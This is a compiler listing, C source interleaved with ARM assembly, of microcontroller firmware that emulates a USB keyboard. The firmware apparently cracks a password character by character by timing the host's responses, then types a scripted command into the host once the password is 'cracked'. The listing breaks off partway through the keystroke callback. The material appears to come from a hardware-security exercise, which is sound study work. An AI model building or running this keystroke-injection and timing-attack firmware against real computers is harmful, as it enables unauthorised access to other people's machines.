+  12:main.c        **** //float log[100];
+  13:main.c        **** float sending_time=0, response_time=0;
+  14:main.c        **** struct correct_key {
+  15:main.c        ****     uint8_t code;
+  16:main.c        ****     uint8_t modifier;
+  17:main.c        **** };
+  18:main.c        **** struct KEY {
+  19:main.c        ****     uint8_t code;
+  20:main.c        ****     uint8_t possible_modifiers[3];
+  21:main.c        **** 	uint8_t number_of_modifiers;
+  22:main.c        **** 	float time[3];
+  23:main.c        **** };
+  24:main.c        **** struct KEY keys[44] = 
+  25:main.c        **** {{GERMAN_KEYBOARD_SC_A , {0,1<<1},2, {0,0}},{GERMAN_KEYBOARD_SC_B , {0,1<<1},2, {0,0}}, {GERMAN_KEY
+  26:main.c        ****  {GERMAN_KEYBOARD_SC_E , {0,1<<1},2, {0,0}}, {GERMAN_KEYBOARD_SC_F , {0,1<<1},2, {0,0}}, {GERMAN_KE
+  27:main.c        ****  {GERMAN_KEYBOARD_SC_I ,{0,1<<1},2, {0,0}}, {GERMAN_KEYBOARD_SC_J , {0,1<<1},2, {0,0}},{GERMAN_KEYB
+  28:main.c        ****  {GERMAN_KEYBOARD_SC_M , {0,1<<1},2, {0,0}},{GERMAN_KEYBOARD_SC_N , {0,1<<1},2, {0,0}},{GERMAN_KEYB
+  29:main.c        ****  {GERMAN_KEYBOARD_SC_Q , {0,1<<1},2, {0,0}},{GERMAN_KEYBOARD_SC_R , {0,1<<1},2, {0,0}},{GERMAN_KEYB
+  30:main.c        ****  {GERMAN_KEYBOARD_SC_U , {0,1<<1},2, {0,0}},{GERMAN_KEYBOARD_SC_V , {0,1<<1},2, {0,0}},{GERMAN_KEYB
+  31:main.c        ****  {GERMAN_KEYBOARD_SC_Y , {0,1<<1},2, {0,0}},{GERMAN_KEYBOARD_SC_Z , {0,1<<1},2, {0,0}}, {GERMAN_KEY
+  32:main.c        **** {GERMAN_KEYBOARD_SC_2_AND_QUOTES, {0,1<<1},2, {0,0}}, {GERMAN_KEYBOARD_SC_3_AND_PARAGRAPH, {0,1<<1}
+  33:main.c        **** {GERMAN_KEYBOARD_SC_5_AND_PERCENTAGE , {0,1<<1},2, {0,0}},{GERMAN_KEYBOARD_SC_6_AND_AMPERSAND , {0,
+  34:main.c        **** {GERMAN_KEYBOARD_SC_7_AND_SLASH_AND_OPENING_BRACE  , {0,1<<1, 1<<6},3, {0,0,0}}, {GERMAN_KEYBOARD_S
+  35:main.c        **** {GERMAN_KEYBOARD_SC_9_AND_CLOSING_PARENTHESIS_AND_CLOSING_BRACKET  , {0,1<<1, 1<<6},3, {0,0,0}},{GE
+  36:main.c        ****  {GERMAN_KEYBOARD_SC_SHARP_S_AND_QUESTION_AND_BACKSLASH, {0,1<<1, 1<<6},3, {0,0,0}}, {GERMAN_KEYBOA
+  37:main.c        ****  {GERMAN_KEYBOARD_SC_PLUS_AND_ASTERISK_AND_TILDE , {0,1<<1, 1<<6},3, {0,0,0}},{GERMAN_KEYBOARD_SC_M
+  38:main.c        ****  {GERMAN_KEYBOARD_SC_COMMA_AND_SEMICOLON, {0,1<<1},2, {0,0,0}},{GERMAN_KEYBOARD_SC_DOT_AND_COLON, {
+  39:main.c        ****   {GERMAN_KEYBOARD_SC_LESS_THAN_AND_GREATER_THAN_AND_PIPE, {0,1<<1, 1<<6},3, {0,0,0}}};
+  40:main.c        **** 
+  41:main.c        **** /*!< DWT Control register */
+  42:main.c        **** #define KIN1_DWT_CONTROL             (*((volatile uint32_t*)0xE0001000))
+  43:main.c        **** 
+  44:main.c        **** /*!< CYCCNTENA bit in DWT_CONTROL register */
+  45:main.c        **** #define KIN1_DWT_CYCCNTENA_BIT       (1UL<<0)
+  46:main.c        **** 
+  47:main.c        **** /*!< DWT Cycle Counter register */
+  48:main.c        **** #define KIN1_DWT_CYCCNT              (*((volatile uint32_t*)0xE0001004))
+  49:main.c        **** 
+  50:main.c        **** /*!< DEMCR: Debug Exception and Monitor Control Register */
+  51:main.c        **** #define KIN1_DEMCR                   (*((volatile uint32_t*)0xE000EDFC))
+  52:main.c        **** 
+  53:main.c        **** /*!< Trace enable bit in DEMCR register */
+  54:main.c        **** #define KIN1_TRCENA_BIT              (1UL<<24)
+  55:main.c        **** 
+  56:main.c        **** #define KIN1_InitCycleCounter() \
+  57:main.c        ****   KIN1_DEMCR |= KIN1_TRCENA_BIT
+  58:main.c        **** 
+  59:main.c        **** /*!< Reset cycle counter */
+  60:main.c        **** #define KIN1_ResetCycleCounter() \
+  61:main.c        ****   KIN1_DWT_CYCCNT = 0
+  62:main.c        **** 
+  63:main.c        **** /*!< Enable cycle counter */
+  64:main.c        **** #define KIN1_EnableCycleCounter() \
+  65:main.c        ****   KIN1_DWT_CONTROL |= KIN1_DWT_CYCCNTENA_BIT
+  66:main.c        **** 
+  67:main.c        **** /*!< Disable cycle counter */
+  68:main.c        **** #define KIN1_DisableCycleCounter() \
+  69:main.c        ****   KIN1_DWT_CONTROL &= ~KIN1_DWT_CYCCNTENA_BIT
+  70:main.c        **** 
+  71:main.c        **** /*!< Read cycle counter register */
+  72:main.c        **** #define KIN1_GetCycleCounter() \
+  73:main.c        ****   KIN1_DWT_CYCCNT
+  74:main.c        **** 
+  75:main.c        **** float millisec=0.0; float log_low[100]; float log_high [100];
+  76:main.c        **** /* Clock configuration */
+  77:main.c        **** XMC_SCU_CLOCK_CONFIG_t clock_config = {
+  78:main.c        **** 	.syspll_config.p_div  = 2,
+  79:main.c        **** 	.syspll_config.n_div  = 80,
+  80:main.c        **** 	.syspll_config.k_div  = 4,
+  81:main.c        **** 	.syspll_config.mode   = XMC_SCU_CLOCK_SYSPLL_MODE_NORMAL,
+  82:main.c        **** 	.syspll_config.clksrc = XMC_SCU_CLOCK_SYSPLLCLKSRC_OSCHP,
+  83:main.c        **** 	.enable_oschp         = true,
+  84:main.c        **** 	.calibration_mode     = XMC_SCU_CLOCK_FOFI_CALIBRATION_MODE_FACTORY,
+  85:main.c        **** 	.fsys_clksrc          = XMC_SCU_CLOCK_SYSCLKSRC_PLL,
+  86:main.c        **** 	.fsys_clkdiv          = 1,
+  87:main.c        **** 	.fcpu_clkdiv          = 1,
+  88:main.c        **** 	.fccu_clkdiv          = 1,
+  89:main.c        **** 	.fperipheral_clkdiv   = 1
+  90:main.c        **** };
+  91:main.c        **** 
+  92:main.c        **** /* Forward declaration of HID callbacks as defined by LUFA */
+  93:main.c        **** bool CALLBACK_HID_Device_CreateHIDReport(
+  94:main.c        **** 							USB_ClassInfo_HID_Device_t* const HIDInterfaceInfo,
+  95:main.c        **** 							uint8_t* const ReportID,
+  96:main.c        **** 							const uint8_t ReportType,
+  97:main.c        **** 							void* ReportData,
+  98:main.c        **** 							uint16_t* const ReportSize );
+  99:main.c        **** 
+ 100:main.c        **** void CALLBACK_HID_Device_ProcessHIDReport(
+ 101:main.c        **** 							USB_ClassInfo_HID_Device_t* const HIDInterfaceInfo,
+ 102:main.c        **** 							const uint8_t ReportID,
+ 103:main.c        **** 							const uint8_t ReportType,
+ 104:main.c        **** 							const void* ReportData,
+ 105:main.c        **** 							const uint16_t ReportSize );
+ 106:main.c        **** 
+ 107:main.c        **** void SystemCoreClockSetup(void);
+ 108:main.c        **** 
+ 109:main.c        **** /**
+ 110:main.c        ****  * Main program entry point. This routine configures the hardware required by
+ 111:main.c        ****  * the application, then enters a loop to run the application tasks in sequence.
+ 112:main.c        ****  */
+ 113:main.c        **** 
+ 114:main.c        **** void getMaxResponse()
+ 115:main.c        **** {
+ 542              		.loc 2 115 1
+ 543              		.cfi_startproc
+ 544              		@ args = 0, pretend = 0, frame = 16
+ 545              		@ frame_needed = 1, uses_anonymous_args = 0
+ 546              		@ link register save eliminated.
+ 547 0000 80B4     		push	{r7}
+ 548              	.LCFI12:
+ 549              		.cfi_def_cfa_offset 4
+ 550              		.cfi_offset 7, -4
+ 551 0002 85B0     		sub	sp, sp, #20
+ 552              	.LCFI13:
+ 553              		.cfi_def_cfa_offset 24
+ 554 0004 00AF     		add	r7, sp, #0
+ 555              	.LCFI14:
+ 556              		.cfi_def_cfa_register 7
+ 116:main.c        **** 
+ 117:main.c        **** 	float max = -1;
+ 557              		.loc 2 117 8
+ 558 0006 264B     		ldr	r3, .L11
+ 559 0008 FB60     		str	r3, [r7, #12]	@ float
+ 560              	.LBB2:
+ 118:main.c        **** 	for (int i=0; i<45; i++)
+ 561              		.loc 2 118 11
+ 562 000a 0023     		movs	r3, #0
+ 563 000c BB60     		str	r3, [r7, #8]
+ 564              		.loc 2 118 2
+ 565 000e 3CE0     		b	.L4
+ 566              	.L9:
+ 567              	.LBB3:
+ 119:main.c        **** 	{
+ 120:main.c        **** 		for (int j=0; j<keys[i].number_of_modifiers; j++)
+ 568              		.loc 2 120 12
+ 569 0010 0023     		movs	r3, #0
+ 570 0012 7B60     		str	r3, [r7, #4]
+ 571              		.loc 2 120 3
+ 572 0014 29E0     		b	.L5
+ 573              	.L8:
+ 121:main.c        **** 		{
+ 122:main.c        **** 			if(keys[i].time[j]>max)
+ 574              		.loc 2 122 19
+ 575 0016 2349     		ldr	r1, .L11+4
+ 576 0018 BA68     		ldr	r2, [r7, #8]
+ 577 001a 1346     		mov	r3, r2
+ 578 001c 9B00     		lsls	r3, r3, #2
+ 579 001e 1344     		add	r3, r3, r2
+ 580 0020 7A68     		ldr	r2, [r7, #4]
+ 581 0022 1344     		add	r3, r3, r2
+ 582 0024 0233     		adds	r3, r3, #2
+ 583 0026 9B00     		lsls	r3, r3, #2
+ 584 0028 0B44     		add	r3, r3, r1
+ 585 002a D3ED007A 		vldr.32	s15, [r3]
+ 586              		.loc 2 122 6
+ 587 002e 97ED037A 		vldr.32	s14, [r7, #12]
+ 588 0032 B4EEE77A 		vcmpe.f32	s14, s15
+ 589 0036 F1EE10FA 		vmrs	APSR_nzcv, FPSCR
+ 590 003a 13D5     		bpl	.L6
+ 123:main.c        **** 				{
+ 124:main.c        **** 					max=keys[i].time[j];
+ 591              		.loc 2 124 9
+ 592 003c 1949     		ldr	r1, .L11+4
+ 593 003e BA68     		ldr	r2, [r7, #8]
+ 594 0040 1346     		mov	r3, r2
+ 595 0042 9B00     		lsls	r3, r3, #2
+ 596 0044 1344     		add	r3, r3, r2
+ 597 0046 7A68     		ldr	r2, [r7, #4]
+ 598 0048 1344     		add	r3, r3, r2
+ 599 004a 0233     		adds	r3, r3, #2
+ 600 004c 9B00     		lsls	r3, r3, #2
+ 601 004e 0B44     		add	r3, r3, r1
+ 602 0050 1B68     		ldr	r3, [r3]	@ float
+ 603 0052 FB60     		str	r3, [r7, #12]	@ float
+ 125:main.c        **** 					maxI=i;
+ 604              		.loc 2 125 10
+ 605 0054 BB68     		ldr	r3, [r7, #8]
+ 606 0056 DAB2     		uxtb	r2, r3
+ 607 0058 134B     		ldr	r3, .L11+8
+ 608 005a 1A70     		strb	r2, [r3]
+ 126:main.c        **** 					maxJ=j;
+ 609              		.loc 2 126 10
+ 610 005c 7B68     		ldr	r3, [r7, #4]
+ 611 005e DAB2     		uxtb	r2, r3
+ 612 0060 124B     		ldr	r3, .L11+12
+ 613 0062 1A70     		strb	r2, [r3]
+ 614              	.L6:
+ 120:main.c        **** 		{
+ 615              		.loc 2 120 49 discriminator 2
+ 616 0064 7B68     		ldr	r3, [r7, #4]
+ 617 0066 0133     		adds	r3, r3, #1
+ 618 0068 7B60     		str	r3, [r7, #4]
+ 619              	.L5:
+ 120:main.c        **** 		{
+ 620              		.loc 2 120 26 discriminator 1
+ 621 006a 0E49     		ldr	r1, .L11+4
+ 622 006c BA68     		ldr	r2, [r7, #8]
+ 623 006e 1346     		mov	r3, r2
+ 624 0070 9B00     		lsls	r3, r3, #2
+ 625 0072 1344     		add	r3, r3, r2
+ 626 0074 9B00     		lsls	r3, r3, #2
+ 627 0076 0B44     		add	r3, r3, r1
+ 628 0078 0433     		adds	r3, r3, #4
+ 629 007a 1B78     		ldrb	r3, [r3]	@ zero_extendqisi2
+ 630 007c 1A46     		mov	r2, r3
+ 120:main.c        **** 		{
+ 631              		.loc 2 120 3 discriminator 1
+ 632 007e 7B68     		ldr	r3, [r7, #4]
+ 633 0080 9342     		cmp	r3, r2
+ 634 0082 C8DB     		blt	.L8
+ 635              	.LBE3:
+ 118:main.c        **** 	{
+ 636              		.loc 2 118 23 discriminator 2
+ 637 0084 BB68     		ldr	r3, [r7, #8]
+ 638 0086 0133     		adds	r3, r3, #1
+ 639 0088 BB60     		str	r3, [r7, #8]
+ 640              	.L4:
+ 118:main.c        **** 	{
+ 641              		.loc 2 118 2 discriminator 1
+ 642 008a BB68     		ldr	r3, [r7, #8]
+ 643 008c 2C2B     		cmp	r3, #44
+ 644 008e BFDD     		ble	.L9
+ 645              	.LBE2:
+ 127:main.c        **** 				}
+ 128:main.c        **** 
+ 129:main.c        **** 		}
+ 130:main.c        **** 
+ 131:main.c        **** 	}
+ 132:main.c        **** 
+ 133:main.c        **** }
+ 646              		.loc 2 133 1
+ 647 0090 00BF     		nop
+ 648 0092 00BF     		nop
+ 649 0094 1437     		adds	r7, r7, #20
+ 650              	.LCFI15:
+ 651              		.cfi_def_cfa_offset 4
+ 652 0096 BD46     		mov	sp, r7
+ 653              	.LCFI16:
+ 654              		.cfi_def_cfa_register 13
+ 655              		@ sp needed
+ 656 0098 5DF8047B 		ldr	r7, [sp], #4
+ 657              	.LCFI17:
+ 658              		.cfi_restore 7
+ 659              		.cfi_def_cfa_offset 0
+ 660 009c 7047     		bx	lr
+ 661              	.L12:
+ 662 009e 00BF     		.align	2
+ 663              	.L11:
+ 664 00a0 000080BF 		.word	-1082130432
+ 665 00a4 00000000 		.word	keys
+ 666 00a8 00000000 		.word	maxI
+ 667 00ac 00000000 		.word	maxJ
+ 668              		.cfi_endproc
+ 669              	.LFE203:
+ 671              		.global	__aeabi_ui2d
+ 672              		.global	__aeabi_ddiv
+ 673              		.global	__aeabi_d2f
+ 674              		.section	.text.main,"ax",%progbits
+ 675              		.align	1
+ 676              		.global	main
+ 677              		.syntax unified
+ 678              		.thumb
+ 679              		.thumb_func
+ 680              		.fpu fpv4-sp-d16
+ 682              	main:
+ 683              	.LFB204:
+ 134:main.c        **** int main(void) {
+ 684              		.loc 2 134 16
+ 685              		.cfi_startproc
+ 686              		@ args = 0, pretend = 0, frame = 16
+ 687              		@ frame_needed = 1, uses_anonymous_args = 0
+ 688 0000 80B5     		push	{r7, lr}
+ 689              	.LCFI18:
+ 690              		.cfi_def_cfa_offset 8
+ 691              		.cfi_offset 7, -8
+ 692              		.cfi_offset 14, -4
+ 693 0002 84B0     		sub	sp, sp, #16
+ 694              	.LCFI19:
+ 695              		.cfi_def_cfa_offset 24
+ 696 0004 00AF     		add	r7, sp, #0
+ 697              	.LCFI20:
+ 698              		.cfi_def_cfa_register 7
+ 135:main.c        **** 	// Init LED pins for debugging and NUM/CAPS visual report
+ 136:main.c        **** 	XMC_GPIO_SetMode(LED1,XMC_GPIO_MODE_OUTPUT_PUSH_PULL);
+ 699              		.loc 2 136 2
+ 700 0006 8022     		movs	r2, #128
+ 701 0008 0121     		movs	r1, #1
+ 702 000a 2F48     		ldr	r0, .L20
+ 703 000c FFF7FEFF 		bl	XMC_GPIO_SetMode
+ 137:main.c        **** 	XMC_GPIO_SetMode(LED2,XMC_GPIO_MODE_OUTPUT_PUSH_PULL);
+ 704              		.loc 2 137 2
+ 705 0010 8022     		movs	r2, #128
+ 706 0012 0021     		movs	r1, #0
+ 707 0014 2C48     		ldr	r0, .L20
+ 708 0016 FFF7FEFF 		bl	XMC_GPIO_SetMode
+ 138:main.c        **** 	USB_Init();
+ 709              		.loc 2 138 2
+ 710 001a FFF7FEFF 		bl	USB_Init
+ 711              	.LBB4:
+ 139:main.c        **** 
+ 140:main.c        **** 	// Wait until host has enumerated HID device
+ 141:main.c        **** 	for(int i = 0; i < 10e6; ++i)
+ 712              		.loc 2 141 10
+ 713 001e 0023     		movs	r3, #0
+ 714 0020 FB60     		str	r3, [r7, #12]
+ 715              		.loc 2 141 2
+ 716 0022 02E0     		b	.L14
+ 717              	.L15:
+ 718              		.loc 2 141 27 discriminator 3
+ 719 0024 FB68     		ldr	r3, [r7, #12]
+ 720 0026 0133     		adds	r3, r3, #1
+ 721 0028 FB60     		str	r3, [r7, #12]
+ 722              	.L14:
+ 723              		.loc 2 141 2 discriminator 1
+ 724 002a FB68     		ldr	r3, [r7, #12]
+ 725 002c 274A     		ldr	r2, .L20+4
+ 726 002e 9342     		cmp	r3, r2
+ 727 0030 F8DB     		blt	.L15
+ 728              	.LBE4:
+ 142:main.c        **** 		; 
+ 143:main.c        **** 
+ 144:main.c        **** 	float sample=0.0, previous_reading=0.0;
+ 729              		.loc 2 144 8
+ 730 0032 4FF00003 		mov	r3, #0
+ 731 0036 7B60     		str	r3, [r7, #4]	@ float
+ 732              		.loc 2 144 20
+ 733 0038 4FF00003 		mov	r3, #0
+ 734 003c BB60     		str	r3, [r7, #8]	@ float
+ 145:main.c        ****     KIN1_InitCycleCounter(); 
+ 735              		.loc 2 145 5
+ 736 003e 244B     		ldr	r3, .L20+8
+ 737 0040 1B68     		ldr	r3, [r3]
+ 738 0042 234A     		ldr	r2, .L20+8
+ 739 0044 43F08073 		orr	r3, r3, #16777216
+ 740 0048 1360     		str	r3, [r2]
+ 146:main.c        ****     KIN1_ResetCycleCounter(); 
+ 741              		.loc 2 146 5
+ 742 004a 224B     		ldr	r3, .L20+12
+ 743 004c 0022     		movs	r2, #0
+ 744 004e 1A60     		str	r2, [r3]
+ 147:main.c        ****     KIN1_EnableCycleCounter(); 	
+ 745              		.loc 2 147 5
+ 746 0050 214B     		ldr	r3, .L20+16
+ 747 0052 1B68     		ldr	r3, [r3]
+ 748 0054 204A     		ldr	r2, .L20+16
+ 749 0056 43F00103 		orr	r3, r3, #1
+ 750 005a 1360     		str	r3, [r2]
+ 751              	.L18:
+ 148:main.c        **** 
+ 149:main.c        **** 	while (1) {
+ 150:main.c        **** 		sample=KIN1_GetCycleCounter()/120000.0;
+ 752              		.loc 2 150 10
+ 753 005c 1D4B     		ldr	r3, .L20+12
+ 754 005e 1B68     		ldr	r3, [r3]
+ 755              		.loc 2 150 32
+ 756 0060 1846     		mov	r0, r3
+ 757 0062 FFF7FEFF 		bl	__aeabi_ui2d
+ 758              	.LVL0:
+ 759 0066 4FF00002 		mov	r2, #0
+ 760 006a 1C4B     		ldr	r3, .L20+20
+ 761 006c FFF7FEFF 		bl	__aeabi_ddiv
+ 762              	.LVL1:
+ 763 0070 0246     		mov	r2, r0
+ 764 0072 0B46     		mov	r3, r1
+ 765              		.loc 2 150 9
+ 766 0074 1046     		mov	r0, r2
+ 767 0076 1946     		mov	r1, r3
+ 768 0078 FFF7FEFF 		bl	__aeabi_d2f
+ 769              	.LVL2:
+ 770 007c 0346     		mov	r3, r0	@ float
+ 771 007e 7B60     		str	r3, [r7, #4]	@ float
+ 151:main.c        **** 		millisec=millisec+sample-previous_reading;
+ 772              		.loc 2 151 20
+ 773 0080 174B     		ldr	r3, .L20+24
+ 774 0082 93ED007A 		vldr.32	s14, [r3]
+ 775 0086 D7ED017A 		vldr.32	s15, [r7, #4]
+ 776 008a 37EE277A 		vadd.f32	s14, s14, s15
+ 777              		.loc 2 151 27
+ 778 008e D7ED027A 		vldr.32	s15, [r7, #8]
+ 779 0092 77EE677A 		vsub.f32	s15, s14, s15
+ 780              		.loc 2 151 11
+ 781 0096 124B     		ldr	r3, .L20+24
+ 782 0098 C3ED007A 		vstr.32	s15, [r3]
+ 152:main.c        **** 		previous_reading=sample;
+ 783              		.loc 2 152 19
+ 784 009c 7B68     		ldr	r3, [r7, #4]	@ float
+ 785 009e BB60     		str	r3, [r7, #8]	@ float
+ 153:main.c        **** 		if(sample>=10000) 
+ 786              		.loc 2 153 5
+ 787 00a0 D7ED017A 		vldr.32	s15, [r7, #4]
+ 788 00a4 9FED0F7A 		vldr.32	s14, .L20+28
+ 789 00a8 F4EEC77A 		vcmpe.f32	s15, s14
+ 790 00ac F1EE10FA 		vmrs	APSR_nzcv, FPSCR
+ 791 00b0 05DB     		blt	.L16
+ 154:main.c        **** 		{
+ 155:main.c        **** 		KIN1_ResetCycleCounter();
+ 792              		.loc 2 155 3
+ 793 00b2 084B     		ldr	r3, .L20+12
+ 794 00b4 0022     		movs	r2, #0
+ 795 00b6 1A60     		str	r2, [r3]
+ 156:main.c        **** 		previous_reading=0;
+ 796              		.loc 2 156 19
+ 797 00b8 4FF00003 		mov	r3, #0
+ 798 00bc BB60     		str	r3, [r7, #8]	@ float
+ 799              	.L16:
+ 157:main.c        **** 		}
+ 158:main.c        **** 		HID_Device_USBTask(&Keyboard_HID_Interface);
+ 800              		.loc 2 158 3
+ 801 00be 0A48     		ldr	r0, .L20+32
+ 802 00c0 FFF7FEFF 		bl	HID_Device_USBTask
+ 150:main.c        **** 		millisec=millisec+sample-previous_reading;
+ 803              		.loc 2 150 9
+ 804 00c4 CAE7     		b	.L18
+ 805              	.L21:
+ 806 00c6 00BF     		.align	2
+ 807              	.L20:
+ 808 00c8 00810248 		.word	1208123648
+ 809 00cc 80969800 		.word	10000000
+ 810 00d0 FCED00E0 		.word	-536809988
+ 811 00d4 041000E0 		.word	-536866812
+ 812 00d8 001000E0 		.word	-536866816
+ 813 00dc 004CFD40 		.word	1090341888
+ 814 00e0 00000000 		.word	millisec
+ 815 00e4 00401C46 		.word	1176256512
+ 816 00e8 00000000 		.word	Keyboard_HID_Interface
+ 817              		.cfi_endproc
+ 818              	.LFE204:
+ 820              		.section	.text.CALLBACK_HID_Device_CreateHIDReport,"ax",%progbits
+ 821              		.align	1
+ 822              		.global	CALLBACK_HID_Device_CreateHIDReport
+ 823              		.syntax unified
+ 824              		.thumb
+ 825              		.thumb_func
+ 826              		.fpu fpv4-sp-d16
+ 828              	CALLBACK_HID_Device_CreateHIDReport:
+ 829              	.LFB205:
+ 159:main.c        **** 		
+ 160:main.c        **** 	}
+ 161:main.c        **** }
+ 162:main.c        **** 
+ 163:main.c        **** // Callback function called when a new HID report needs to be created
+ 164:main.c        **** bool CALLBACK_HID_Device_CreateHIDReport(USB_ClassInfo_HID_Device_t* const HIDInterfaceInfo, uint8_
+ 830              		.loc 2 164 192
+ 831              		.cfi_startproc
+ 832              		@ args = 4, pretend = 0, frame = 24
+ 833              		@ frame_needed = 1, uses_anonymous_args = 0
+ 834 0000 90B5     		push	{r4, r7, lr}
+ 835              	.LCFI21:
+ 836              		.cfi_def_cfa_offset 12
+ 837              		.cfi_offset 4, -12
+ 838              		.cfi_offset 7, -8
+ 839              		.cfi_offset 14, -4
+ 840 0002 87B0     		sub	sp, sp, #28
+ 841              	.LCFI22:
+ 842              		.cfi_def_cfa_offset 40
+ 843 0004 00AF     		add	r7, sp, #0
+ 844              	.LCFI23:
+ 845              		.cfi_def_cfa_register 7
+ 846 0006 F860     		str	r0, [r7, #12]
+ 847 0008 B960     		str	r1, [r7, #8]
+ 848 000a 3B60     		str	r3, [r7]
+ 849 000c 1346     		mov	r3, r2
+ 850 000e FB71     		strb	r3, [r7, #7]
+ 165:main.c        **** 	
+ 166:main.c        **** 	USB_KeyboardReport_Data_t* report = (USB_KeyboardReport_Data_t *)ReportData;
+ 851              		.loc 2 166 29
+ 852 0010 3B68     		ldr	r3, [r7]
+ 853 0012 7B61     		str	r3, [r7, #20]
+ 167:main.c        **** 	*ReportSize = sizeof(USB_KeyboardReport_Data_t);
+ 854              		.loc 2 167 14
+ 855 0014 BB6A     		ldr	r3, [r7, #40]
+ 856 0016 0822     		movs	r2, #8
+ 857 0018 1A80     		strh	r2, [r3]	@ movhi
+ 168:main.c        **** 
+ 169:main.c        **** 	static uint8_t characterSent = 0, indexToSend = 0, c=0;
+ 170:main.c        **** 	static struct correct_key pass[100];
+ 171:main.c        **** 	static uint8_t i=0,j=0,x=0,y=0,  acc=0, iindex=0, jindex=0;
+ 172:main.c        **** 	static uint8_t CMD_msg[28] = { GERMAN_KEYBOARD_SC_C, GERMAN_KEYBOARD_SC_D, GERMAN_KEYBOARD_SC_ENTE
+ 173:main.c        **** GERMAN_KEYBOARD_SC_E, GERMAN_KEYBOARD_SC_C, GERMAN_KEYBOARD_SC_H, GERMAN_KEYBOARD_SC_O, GERMAN_KEYB
+ 174:main.c        **** GERMAN_KEYBOARD_SC_0_AND_EQUAL_AND_CLOSING_BRACE,GERMAN_KEYBOARD_SC_3_AND_PARAGRAPH,GERMAN_KEYBOARD
+ 175:main.c        **** GERMAN_KEYBOARD_SC_2_AND_QUOTES,GERMAN_KEYBOARD_SC_H, GERMAN_KEYBOARD_SC_A,GERMAN_KEYBOARD_SC_C, GE
+ 176:main.c        **** static uint8_t CMD_mod[28] = {2,2,0,2,2,2,2,0,2,2,0,0,0,0,0,0,0,0,0,2,2,2,2,2,2,2,2,0};
+ 177:main.c        **** if(cracked){
+ 858              		.loc 2 177 4
+ 859 001a A54B     		ldr	r3, .L41
+ 860 001c 1B78     		ldrb	r3, [r3]	@ zero_extendqisi2
+ 861              		.loc 2 177 3
+ 862 001e 002B     		cmp	r3, #0
+ 863 0020 30D0     		beq	.L23
+ 178:main.c        **** 	if(indexToSend < 28) {
+ 864              		.loc 2 178 17
+ 865 0022 A44B     		ldr	r3, .L41+4
+ 866 0024 1B78     		ldrb	r3, [r3]	@ zero_extendqisi2
+ 867              		.loc 2 178 4
+ 868 0026 1B2B     		cmp	r3, #27
+ 869 0028 00F2C081 		bhi	.L24
+ 179:main.c        **** 		if(characterSent) {
+ 870              		.loc 2 179 6
+ 871 002c A24B     		ldr	r3, .L41+8
+ 872 002e 1B78     		ldrb	r3, [r3]	@ zero_extendqisi2
+ 873              		.loc 2 179 5
+ 874 0030 002B     		cmp	r3, #0
+ 875 0032 12D0     		beq	.L25
+ 180:main.c        **** 			report->Modifier = 0; 
+ 876              		.loc 2 180 21
+ 877 0034 7B69     		ldr	r3, [r7, #20]
+ 878 0036 0022     		movs	r2, #0
+ 879 0038 1A70     		strb	r2, [r3]
+ 181:main.c        **** 			report->Reserved = 0; 
+ 880              		.loc 2 181 21
+ 881 003a 7B69     		ldr	r3, [r7, #20]
+ 882 003c 0022     		movs	r2, #0
+ 883 003e 5A70     		strb	r2, [r3, #1]
+ 182:main.c        **** 			report->KeyCode[0] = 0; 
+ 884              		.loc 2 182 23
+ 885 0040 7B69     		ldr	r3, [r7, #20]
+ 886 0042 0022     		movs	r2, #0
+ 887 0044 9A70     		strb	r2, [r3, #2]
+ 183:main.c        **** 			characterSent = 0;
+ 888              		.loc 2 183 18
+ 889 0046 9C4B     		ldr	r3, .L41+8
+ 890 0048 0022     		movs	r2, #0
+ 891 004a 1A70     		strb	r2, [r3]
+ 184:main.c        **** 			++indexToSend; 
+ 892              		.loc 2 184 4
+ 893 004c 994B     		ldr	r3, .L41+4
+ 894 004e 1B78     		ldrb	r3, [r3]	@ zero_extendqisi2
+ 895 0050 0133     		adds	r3, r3, #1
+ 896 0052 DAB2     		uxtb	r2, r3
+ 897 0054 974B     		ldr	r3, .L41+4
+ 898 0056 1A70     		strb	r2, [r3]
+ 899 0058 A8E1     		b	.L24
+ 900              	.L25:
+ 185:main.c        **** 		} else {
+ 186:main.c        **** 			report->Modifier = CMD_mod[indexToSend]; 
+ 901              		.loc 2 186 30
+ 902 005a 964B     		ldr	r3, .L41+4
+ 903 005c 1B78     		ldrb	r3, [r3]	@ zero_extendqisi2
+ 904 005e 1A46     		mov	r2, r3
+ 905 0060 964B     		ldr	r3, .L41+12
+ 906 0062 9A5C     		ldrb	r2, [r3, r2]	@ zero_extendqisi2
+ 907              		.loc 2 186 21
+ 908 0064 7B69     		ldr	r3, [r7, #20]
+ 909 0066 1A70     		strb	r2, [r3]
+ 187:main.c        **** 			report->Reserved = 0; 
+ 910              		.loc 2 187 21
+ 911 0068 7B69     		ldr	r3, [r7, #20]
+ 912 006a 0022     		movs	r2, #0
+ 913 006c 5A70     		strb	r2, [r3, #1]
+ 188:main.c        **** 			report->KeyCode[0] = CMD_msg[indexToSend]; 
+ 914              		.loc 2 188 32
+ 915 006e 914B     		ldr	r3, .L41+4
+ 916 0070 1B78     		ldrb	r3, [r3]	@ zero_extendqisi2
+ 917 0072 1A46     		mov	r2, r3
+ 918 0074 924B     		ldr	r3, .L41+16
+ 919 0076 9A5C     		ldrb	r2, [r3, r2]	@ zero_extendqisi2
+ 920              		.loc 2 188 23
+ 921 0078 7B69     		ldr	r3, [r7, #20]
+ 922 007a 9A70     		strb	r2, [r3, #2]
+ 189:main.c        **** 			characterSent = 1;
+ 923              		.loc 2 189 18
+ 924 007c 8E4B     		ldr	r3, .L41+8
+ 925 007e 0122     		movs	r2, #1
+ 926 0080 1A70     		strb	r2, [r3]
+ 927 0082 93E1     		b	.L24
+ 928              	.L23:
+ 190:main.c        **** 		}
+ 191:main.c        **** }
+ 192:main.c        **** }
+ 193:main.c        **** else if(i <= 44 && ((feedback_received && NUMLOCK_PRESSES>1)||!sent)) {
+ 929              		.loc 2 193 11
+ 930 0084 8F4B     		ldr	r3, .L41+20
+ 931 0086 1B78     		ldrb	r3, [r3]	@ zero_extendqisi2
+ 932              		.loc 2 193 8
+ 933 0088 2C2B     		cmp	r3, #44
+ 934 008a 00F28F81 		bhi	.L24
+ 935              		.loc 2 193 22 discriminator 1
+ 936 008e 8E4B     		ldr	r3, .L41+24
+ 937 0090 1B78     		ldrb	r3, [r3]	@ zero_extendqisi2
+ 938              		.loc 2 193 17 discriminator 1
+ 939 0092 002B     		cmp	r3, #0
+ 940 0094 03D0     		beq	.L26
+ 941              		.loc 2 193 58 discriminator 2
+ 942 0096 8D4B     		ldr	r3, .L41+28
+ 943 0098 1B78     		ldrb	r3, [r3]	@ zero_extendqisi2
